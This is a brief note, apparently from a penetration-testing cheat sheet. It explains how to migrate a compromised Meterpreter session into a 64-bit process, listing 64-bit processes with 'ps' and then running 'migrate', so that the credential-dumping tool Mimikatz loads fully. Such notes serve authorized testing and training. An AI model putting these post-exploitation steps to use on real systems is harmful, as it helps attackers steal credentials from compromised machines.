        ==> V.I Note: mimikatz get the best out of it, if session running on 64-bit process. this allows it to successuflly load all mimikatz
        features without any issues.

            1st: meterpreter> ps -A x86_64 -s
                ==> explanation: retrieve all process arch with x64 only.
            2nd: migrate <pid>
                ==> migrate with process that arch is x64.
